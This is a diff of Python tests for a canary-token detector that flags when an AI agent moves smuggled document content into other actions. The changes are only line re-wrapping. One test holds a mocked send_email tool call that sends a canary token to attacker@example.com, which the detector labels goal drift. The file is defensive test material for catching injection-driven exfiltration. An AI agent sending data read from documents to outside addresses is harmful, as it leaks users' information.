@@ -63,7 +63,9 @@ def test_cross_tool_smuggling_is_goal_drift():
     action = AgentAction(
         kind="tool_call",
         name="send_email",
-        text=json.dumps({"to": "attacker@example.com", "body": "FYI [" + canary.token + "] done"}),
+        text=json.dumps(
+            {"to": "attacker@example.com", "body": "FYI [" + canary.token + "] done"}
+        ),
     )
     verdict = trap.assess(action)
     assert verdict.status == "goal_drift"
@@ -79,7 +81,9 @@ def test_canary_in_outbound_message_is_echo():
     trap = _trap()
     _, canary = trap.smuggle("doc body", source="read_doc")
     verdict = trap.assess(
-        AgentAction(kind="message", name="user", text="Here you go: [" + canary.token + "]")
+        AgentAction(
+            kind="message", name="user", text="Here you go: [" + canary.token + "]"
+        )
     )
     assert verdict.status == "echo"
     assert verdict.severity == "medium"
@@ -89,7 +93,9 @@ def test_canary_looped_into_source_tool_is_echo_not_drift():
     trap = _trap()
     _, canary = trap.smuggle("doc body", source="read_doc")
     verdict = trap.assess(
-        AgentAction(kind="tool_call", name="read_doc", text=json.dumps({"doc_id": canary.token}))
+        AgentAction(
+            kind="tool_call", name="read_doc", text=json.dumps({"doc_id": canary.token})
+        )
     )
     assert verdict.status == "echo"
 
@@ -99,7 +105,9 @@ def test_clean_action_has_no_hits():
     trap.smuggle("doc body", source="read_doc")
     verdict = trap.assess(
         AgentAction(
-            kind="tool_call", name="send_email", text=json.dumps({"to": "a@b.c", "body": "hello"})
+            kind="tool_call",
+            name="send_email",
+            text=json.dumps({"to": "a@b.c", "body": "hello"}),
         )
     )
     assert verdict.status == "clean"
@@ -110,7 +118,9 @@ def test_clean_action_has_no_hits():
 def test_unregistered_token_prefix_alone_is_not_a_hit():
     trap = _trap()
     verdict = trap.assess(
-        AgentAction(kind="message", name="user", text="the " + CANARY_PREFIX + " scheme")
+        AgentAction(
+            kind="message", name="user", text="the " + CANARY_PREFIX + " scheme"
+        )
     )
     assert verdict.status == "clean"
 
